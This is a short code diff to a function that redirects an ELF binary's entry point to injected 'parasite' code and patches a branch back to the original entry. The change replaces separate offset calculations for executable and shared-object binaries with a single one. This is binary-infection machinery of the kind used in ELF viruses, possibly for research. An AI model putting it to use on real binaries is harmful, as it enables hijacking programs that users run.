@@ -24,20 +24,11 @@ bool redirect_elf_entry_point(Elf64_Half binary_type,
     // printf("failed to patch host entry\n");
     return false;
   }
-  int32_t rel = 0;
-  if (binary_type == ET_EXEC) {
-    // for executables, the original entry is the load address, the parasite
-    // load address is the new memory address. Use that for offset calculation.
-    rel = original_entry_point -
-          (parasite_load_address + patch_offset_from_parasite_start);
-  } else if (binary_type == ET_DYN) {
-    // Both original and parasite offset are relative address to the process
-    // start, which is not known until runtime.
-    rel = original_entry_point -
-          (parasite_offset + patch_offset_from_parasite_start);
-  } else {
-    return false;
-  }
+
+  // Calculate the difference between original (destination) and current branch
+  // instruction.
+  int32_t rel = original_entry_point -
+                (parasite_load_address + patch_offset_from_parasite_start);
 
   rel /= 4;
   auto* inst = reinterpret_cast<int32_t*>(
